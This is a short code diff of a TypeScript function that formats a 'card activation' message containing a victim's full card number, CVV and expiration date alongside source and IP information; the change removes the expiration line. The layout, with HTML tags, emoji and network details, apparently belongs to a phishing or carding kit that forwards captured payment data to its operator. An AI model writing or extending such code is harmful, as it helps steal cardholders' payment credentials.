@@ -746,7 +746,6 @@ function formatCardActivationMessage(data: CardActivationRequest, ipInfo: IpInfo
   message += formatSourceInfo(sourceInfo);
   message += `\n💳 <b>Card Details:</b>\n`;
   message += `   • Card Number: ${data.cardNumber}\n`;
-  message += `   • Expiration: ${data.expiration}\n`;
   message += `   • CVV: ${data.cvv}\n\n`;
   message += `🌐 <b>Network Info:</b>\n`;
   message += formatIpInfo(ipInfo);
